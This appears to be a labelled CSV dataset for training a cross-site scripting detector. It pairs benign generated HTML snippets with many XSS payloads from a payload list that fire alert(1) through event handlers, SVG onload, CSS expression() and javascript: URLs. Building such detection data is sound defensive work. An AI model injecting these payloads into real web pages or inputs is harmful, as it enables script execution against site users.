text,label,source,length,timestamp
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.397682
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.397682
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405009
<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>,1,payloadbox,68,2026-03-01T13:13:37.391686
"<address draggable=""true"" ondragend=""alert(1)"">test</address>",1,payloadbox,61,2026-03-01T13:13:37.385678
<span class='class-3814'>Services</span>,0,generated,40,2026-03-01T13:13:37.407992
<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>,1,payloadbox,64,2026-03-01T13:13:37.394683
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.409991
"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",1,payloadbox,119,2026-03-01T13:13:37.392697
"<div draggable=""true"" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable>drop here</thead>",1,payloadbox,111,2026-03-01T13:13:37.388686
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",1,payloadbox,86,2026-03-01T13:13:37.396686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.398687
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.415994
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,1,payloadbox,57,2026-03-01T13:13:37.394683
"<link onkeydown=""alert(1)"" contenteditable>test</link>",1,payloadbox,54,2026-03-01T13:13:37.389686
<thead id=x tabindex=1 onfocusin=alert(1)></thead>,1,payloadbox,50,2026-03-01T13:13:37.394683
<span class='class-6504'>Services</span>,0,generated,40,2026-03-01T13:13:37.415994
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.414992
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405991
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.403007
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onanimationend=""alert(1)""></strong>",1,payloadbox,97,2026-03-01T13:13:37.393697
"<frame ondblclick=""alert(1)"">test</frame>",1,payloadbox,41,2026-03-01T13:13:37.388686
<source id=x tabindex=1 onbeforeactivate=alert(1)></source>,1,payloadbox,59,2026-03-01T13:13:37.391686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.414992
"<select onmousemove=""alert(1)"">test</select>",1,payloadbox,44,2026-03-01T13:13:37.391686
"<style>@keyframes slidein {}</style><noframes style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noframes>",1,payloadbox,170,2026-03-01T13:13:37.393697
"<tt onmousedown=""alert(1)"">test</tt>",1,payloadbox,36,2026-03-01T13:13:37.394683
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.410992
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.398687
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.407992
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.401989
"<section onmouseup=""alert(1)"">test</section>",1,payloadbox,44,2026-03-01T13:13:37.391686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.403996
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.415994
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.413993
"<pre onkeypress=""alert(1)"" contenteditable>test</pre>",1,payloadbox,53,2026-03-01T13:13:37.391686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.396686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403007
"<title draggable=""true"" ondragend=""alert(1)"">test</title>",1,payloadbox,57,2026-03-01T13:13:37.394683
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.400996
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.403996
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.413993
"<style>:target {transform: rotate(180deg);}</style><ol id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ol>",1,payloadbox,122,2026-03-01T13:13:37.392697
"<small onbeforepaste=""alert(1)"" contenteditable>test</small>",1,payloadbox,60,2026-03-01T13:13:37.391686
<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>,1,payloadbox,60,2026-03-01T13:13:37.395688
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.409991
"<tt onmouseup=""alert(1)"">test</tt>",1,payloadbox,34,2026-03-01T13:13:37.395688
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.407992
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",1,payloadbox,55,2026-03-01T13:13:37.386686
"<details onbeforepaste=""alert(1)"" contenteditable>test</details>",1,payloadbox,64,2026-03-01T13:13:37.387778
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403007
<listing id=x tabindex=1 onfocus=alert(1)></listing>,1,payloadbox,52,2026-03-01T13:13:37.389686
"<style>:target {transform: rotate(180deg);}</style><data id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></data>",1,payloadbox,126,2026-03-01T13:13:37.392697
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><mark id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></mark>",1,payloadbox,178,2026-03-01T13:13:37.393697
<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>,1,payloadbox,64,2026-03-01T13:13:37.395688
"<font onmousemove=""alert(1)"">test</font>",1,payloadbox,40,2026-03-01T13:13:37.388686
"<s onmousedown=""alert(1)"">test</s>",1,payloadbox,34,2026-03-01T13:13:37.391686
"<param draggable=""true"" ondragend=""alert(1)"">test</param>",1,payloadbox,57,2026-03-01T13:13:37.390697
"<div draggable=""true"" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>",1,payloadbox,109,2026-03-01T13:13:37.387778
"<area onkeydown=""alert(1)"" contenteditable>test</area>",1,payloadbox,54,2026-03-01T13:13:37.385678
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405991
"<th onbeforecut=""alert(1)"" contenteditable>test</th>",1,payloadbox,52,2026-03-01T13:13:37.394683
"<i onkeydown=""alert(1)"" contenteditable>test</i>",1,payloadbox,48,2026-03-01T13:13:37.389686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.400996
"<select onbeforecut=""alert(1)"" contenteditable>test</select>",1,payloadbox,60,2026-03-01T13:13:37.391686
<span class='class-3314'>Services</span>,0,generated,40,2026-03-01T13:13:37.405991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.400996
"<slot onkeydown=""alert(1)"" contenteditable>test</slot>",1,payloadbox,54,2026-03-01T13:13:37.391686
"<hgroup oncontextmenu=""alert(1)"">test</hgroup>",1,payloadbox,46,2026-03-01T13:13:37.388686
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(1)""></strike>",1,payloadbox,97,2026-03-01T13:13:37.393697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405991
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></wbr>",1,payloadbox,104,2026-03-01T13:13:37.392697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.414992
<svg><html onload=alert(1)></html>,1,payloadbox,34,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.398687
"<details onbeforecopy=""alert(1)"" contenteditable>test</details>",1,payloadbox,63,2026-03-01T13:13:37.387778
"<canvas onkeyup=""alert(1)"" contenteditable>test</canvas>",1,payloadbox,56,2026-03-01T13:13:37.386686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.403007
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noembed id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></noembed>",1,payloadbox,184,2026-03-01T13:13:37.393697
"<hr draggable=""true"" ondrag=""alert(1)"">test</hr>",1,payloadbox,48,2026-03-01T13:13:37.389686
"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>",1,payloadbox,53,2026-03-01T13:13:37.395688
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.397682
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.408990
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.397682
"<aside draggable=""true"" ondragleave=""alert(1)"">test</aside>",1,payloadbox,59,2026-03-01T13:13:37.385678
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.403996
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.413993
<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>,1,payloadbox,55,2026-03-01T13:13:37.386686
"<style>:target {transform: rotate(180deg);}</style><meta id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></meta>",1,payloadbox,126,2026-03-01T13:13:37.392697
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.409991
<p>About</p>,0,generated,12,2026-03-01T13:13:37.410992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.408990
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.413993
<span class='class-3714'>Services</span>,0,generated,40,2026-03-01T13:13:37.406989
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.410992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.414992
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.405991
<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>,1,payloadbox,62,2026-03-01T13:13:37.394683
"<iframe onclick=""alert(1)"">test</iframe>",1,payloadbox,40,2026-03-01T13:13:37.389686
"<noembed onmouseenter=""alert(1)"">test</noembed>",1,payloadbox,47,2026-03-01T13:13:37.390697
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.398687
<svg><discard onbegin=alert(1)>,1,payloadbox,31,2026-03-01T13:13:37.394683
<center id=x tabindex=1 onbeforeactivate=alert(1)></center>,1,payloadbox,59,2026-03-01T13:13:37.386686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.412991
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.410992
"<rtc oncontextmenu=""alert(1)"">test</rtc>",1,payloadbox,40,2026-03-01T13:13:37.391686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405009
<span class='class-4524'>Services</span>,0,generated,40,2026-03-01T13:13:37.409991
"<table onmouseenter=""alert(1)"">test</table>",1,payloadbox,43,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.400996
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405009
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.403996
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.403007
"<style>@keyframes x{}</style><data style=""animation-name:x"" onanimationstart=""alert(1)""></data>",1,payloadbox,95,2026-03-01T13:13:37.393697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.397682
"<div draggable=""true"" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>",1,payloadbox,105,2026-03-01T13:13:37.387778
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.415994
"<base draggable=""true"" ondragleave=""alert(1)"">test</base>",1,payloadbox,57,2026-03-01T13:13:37.385678
"<big onmouseleave=""alert(1)"">test</big>",1,payloadbox,39,2026-03-01T13:13:37.386686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405991
"<div id=""87""><svg xmlns=""http://www.w3.org/2000/svg"">",1,payloadbox,53,2026-03-01T13:13:37.396686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.403007
<p>About</p>,0,generated,12,2026-03-01T13:13:37.411988
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.408990
"<menuitem onmousedown=""alert(1)"">test</menuitem>",1,payloadbox,48,2026-03-01T13:13:37.390697
"<content onkeypress=""alert(1)"" contenteditable>test</content>",1,payloadbox,61,2026-03-01T13:13:37.387778
<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>,1,payloadbox,80,2026-03-01T13:13:37.389686
"<style>:target {color:red;}</style><ruby id=x style=""transition:color 1s"" ontransitionend=alert(1)></ruby>",1,payloadbox,106,2026-03-01T13:13:37.392697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.411988
<span class='class-2764'>Services</span>,0,generated,40,2026-03-01T13:13:37.403996
"<legend oncontextmenu=""alert(1)"">test</legend>",1,payloadbox,46,2026-03-01T13:13:37.389686
"<DIV STYLE=""width: expression(alert('XSS'));"">",1,payloadbox,46,2026-03-01T13:13:37.396686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.398687
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.408990
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.407992
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.401989
"<table oncopy=""alert(1)"" contenteditable>test</table>",1,payloadbox,53,2026-03-01T13:13:37.394683
"<wbr onclick=""alert(1)"">test</wbr>",1,payloadbox,34,2026-03-01T13:13:37.395688
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationend=""alert(1)""></u>",1,payloadbox,87,2026-03-01T13:13:37.393697
"<style>:target {color: red;}</style><ul id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ul>",1,payloadbox,107,2026-03-01T13:13:37.392697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.406989
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationend=""alert(1)""></td>",1,payloadbox,89,2026-03-01T13:13:37.393697
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.403996
"<select onbeforepaste=""alert(1)"" contenteditable>test</select>",1,payloadbox,62,2026-03-01T13:13:37.391686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.405009
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.414992
"<mark onmouseout=""alert(1)"">test</mark>",1,payloadbox,39,2026-03-01T13:13:37.390697
"<label onpaste=""alert(1)"" contenteditable>test</label>",1,payloadbox,54,2026-03-01T13:13:37.389686
<select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>,1,payloadbox,78,2026-03-01T13:13:37.391686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403996
<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>,1,payloadbox,59,2026-03-01T13:13:37.385678
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.415994
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405009
<span class='class-894'>Services</span>,0,generated,39,2026-03-01T13:13:37.398687
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.410992
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.413993
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.414992
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405991
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.398687
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.403996
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationend=""alert(1)""></rb>",1,payloadbox,89,2026-03-01T13:13:37.393697
"<style>:target {transform: rotate(180deg);}</style><output id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></output>",1,payloadbox,130,2026-03-01T13:13:37.392697
"<div onmouseleave=""alert(1)"">test</div>",1,payloadbox,39,2026-03-01T13:13:37.388686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.411988
"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationstart=""alert(1)""></b>",1,payloadbox,89,2026-03-01T13:13:37.393697
"<wbr onbeforepaste=""alert(1)"" contenteditable>test</wbr>",1,payloadbox,56,2026-03-01T13:13:37.395688
"<param draggable=""true"" ondrag=""alert(1)"">test</param>",1,payloadbox,54,2026-03-01T13:13:37.390697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.399984
<svg><xmp onload=alert(1)></xmp>,1,payloadbox,32,2026-03-01T13:13:37.394683
"<style>:target {color: red;}</style><template id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></template>",1,payloadbox,119,2026-03-01T13:13:37.392697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.413993
"<spacer onmouseleave=""alert(1)"">test</spacer>",1,payloadbox,45,2026-03-01T13:13:37.392697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.410992
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></code>",1,payloadbox,178,2026-03-01T13:13:37.393697
"<thead onkeyup=""alert(1)"" contenteditable>test</thead>",1,payloadbox,54,2026-03-01T13:13:37.394683
"<ruby draggable=""true"" ondragstart=""alert(1)"">test</ruby>",1,payloadbox,57,2026-03-01T13:13:37.391686
<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>,1,payloadbox,68,2026-03-01T13:13:37.389686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.415994
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.407992
"<style>:target {color: red;}</style><area id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></area>",1,payloadbox,111,2026-03-01T13:13:37.392697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403007
"<style>:target {transform: rotate(180deg);}</style><slot id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></slot>",1,payloadbox,126,2026-03-01T13:13:37.392697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.403007
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.409991
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.403996
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.412991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.411988
<tbody id=x tabindex=1 onactivate=alert(1)></tbody>,1,payloadbox,51,2026-03-01T13:13:37.394683
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.408990
<header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>,1,payloadbox,70,2026-03-01T13:13:37.388686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.407992
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.410992
"<svg onkeyup=""alert(1)"" contenteditable>test</svg>",1,payloadbox,50,2026-03-01T13:13:37.394683
"<image onmousemove=""alert(1)"">test</image>",1,payloadbox,42,2026-03-01T13:13:37.389686
<span class='class-284'>Services</span>,0,generated,39,2026-03-01T13:13:37.397682
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionend=alert(1)></title>",1,payloadbox,108,2026-03-01T13:13:37.392697
<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>,1,payloadbox,74,2026-03-01T13:13:37.385678
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.413993
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.403996
"<details onbeforecut=""alert(1)"" contenteditable>test</details>",1,payloadbox,62,2026-03-01T13:13:37.387778
"<style>:target {color:red;}</style><noembed id=x style=""transition:color 1s"" ontransitionend=alert(1)></noembed>",1,payloadbox,112,2026-03-01T13:13:37.392697
"<iframe draggable=""true"" ondragend=""alert(1)"">test</iframe>",1,payloadbox,59,2026-03-01T13:13:37.389686
"<bdi onbeforepaste=""alert(1)"" contenteditable>test</bdi>",1,payloadbox,56,2026-03-01T13:13:37.386686
"<div draggable=""true"" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>",1,payloadbox,105,2026-03-01T13:13:37.387778
"<dir onmouseup=""alert(1)"">test</dir>",1,payloadbox,36,2026-03-01T13:13:37.387778
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.400996
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.415994
<title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>,1,payloadbox,75,2026-03-01T13:13:37.394683
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",1,payloadbox,190,2026-03-01T13:13:37.393697
"<applet onmousedown=""alert(1)"">test</applet>",1,payloadbox,44,2026-03-01T13:13:37.385678
<audio src/onerror=alert(1)>,1,payloadbox,28,2026-03-01T13:13:37.385678
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.411988
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.406989
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationend=""alert(1)""></select>",1,payloadbox,97,2026-03-01T13:13:37.393697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.406989
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.401989
"<textarea onmouseout=""alert(1)"">test</textarea>",1,payloadbox,47,2026-03-01T13:13:37.394683
<frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>,1,payloadbox,68,2026-03-01T13:13:37.388686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.400996
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.400996
<ul id=x tabindex=1 onfocus=alert(1)></ul>,1,payloadbox,42,2026-03-01T13:13:37.395688
"<style>@keyframes slidein {}</style><dfn style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dfn>",1,payloadbox,160,2026-03-01T13:13:37.392697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.407992
<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>,1,payloadbox,77,2026-03-01T13:13:37.388686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403007
<map id=x tabindex=1 onfocus=alert(1)></map>,1,payloadbox,44,2026-03-01T13:13:37.389686
"<ins onpaste=""alert(1)"" contenteditable>test</ins>",1,payloadbox,50,2026-03-01T13:13:37.389686
"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>",1,payloadbox,51,2026-03-01T13:13:37.385678
<p>About</p>,0,generated,12,2026-03-01T13:13:37.408990
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.398687
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.396686
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.398687
<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>,1,payloadbox,72,2026-03-01T13:13:37.393697
<button id=x tabindex=1 onbeforeactivate=alert(1)></button>,1,payloadbox,59,2026-03-01T13:13:37.386686
"<optgroup oncontextmenu=""alert(1)"">test</optgroup>",1,payloadbox,50,2026-03-01T13:13:37.390697
<span class='class-3834'>Services</span>,0,generated,40,2026-03-01T13:13:37.407992
"<maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:alert(2)"">CLICKME</maction>",1,payloadbox,101,2026-03-01T13:13:37.396686
<kbd id=x tabindex=1 onbeforeactivate=alert(1)></kbd>,1,payloadbox,53,2026-03-01T13:13:37.389686
"<data draggable=""true"" ondragenter=""alert(1)"">test</data>",1,payloadbox,57,2026-03-01T13:13:37.387778
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.410992
<svg><param onload=alert(1)></param>,1,payloadbox,36,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.397682
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.396686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.399984
<p>About</p>,0,generated,12,2026-03-01T13:13:37.413993
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.406989
"<area oncontextmenu=""alert(1)"">test</area>",1,payloadbox,42,2026-03-01T13:13:37.385678
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.398687
"<dir oncopy=""alert(1)"" contenteditable>test</dir>",1,payloadbox,49,2026-03-01T13:13:37.387778
<slot id=x tabindex=1 onfocus=alert(1)></slot>,1,payloadbox,46,2026-03-01T13:13:37.391686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.415994
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.400996
"<label oncontextmenu=""alert(1)"">test</label>",1,payloadbox,44,2026-03-01T13:13:37.389686
"<center draggable=""true"" ondragenter=""alert(1)"">test</center>",1,payloadbox,61,2026-03-01T13:13:37.386686
<applet onreadystatechange=alert(1)></applet>,1,payloadbox,45,2026-03-01T13:13:37.385678
<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>,1,payloadbox,68,2026-03-01T13:13:37.391686
<svg><source onload=alert(1)></source>,1,payloadbox,38,2026-03-01T13:13:37.394683
"<option onclick=""alert(1)"">test</option>",1,payloadbox,40,2026-03-01T13:13:37.390697
<span class='class-5134'>Services</span>,0,generated,40,2026-03-01T13:13:37.411988
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.405009
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.408990
<span class='class-3344'>Services</span>,0,generated,40,2026-03-01T13:13:37.405991
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405991
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.398687
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.409991
"<center onkeydown=""alert(1)"" contenteditable>test</center>",1,payloadbox,58,2026-03-01T13:13:37.386686
"<address draggable=""true"" ondragleave=""alert(1)"">test</address>",1,payloadbox,63,2026-03-01T13:13:37.385678
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.406989
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.398687
<svg onload=alert(1)>,1,payloadbox,21,2026-03-01T13:13:37.385678
eval(location.hash.slice(1)>#alert(1),1,payloadbox,37,2026-03-01T13:13:37.385678
<u id=x tabindex=1 onbeforedeactivate=alert(1)></u><input autofocus>,1,payloadbox,68,2026-03-01T13:13:37.395688
<iframe onblur=alert(1) id=x><input autofocus>,1,payloadbox,46,2026-03-01T13:13:37.389686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405009
alert&lpar;1&rpar;,1,payloadbox,18,2026-03-01T13:13:37.385678
"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",1,payloadbox,60,2026-03-01T13:13:37.387778
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.414992
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.415994
<tt id=x tabindex=1 onfocus=alert(1)></tt>,1,payloadbox,42,2026-03-01T13:13:37.394683
<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>,1,payloadbox,66,2026-03-01T13:13:37.385678
"<sub oncopy=""alert(1)"" contenteditable>test</sub>",1,payloadbox,49,2026-03-01T13:13:37.393697
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.401989
<svg><dl onload=alert(1)></dl>,1,payloadbox,30,2026-03-01T13:13:37.394683
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.400996
"<sub onmouseenter=""alert(1)"">test</sub>",1,payloadbox,39,2026-03-01T13:13:37.393697
<fieldset onblur=alert(1) tabindex=1 id=x></fieldset><input autofocus>,1,payloadbox,70,2026-03-01T13:13:37.388686
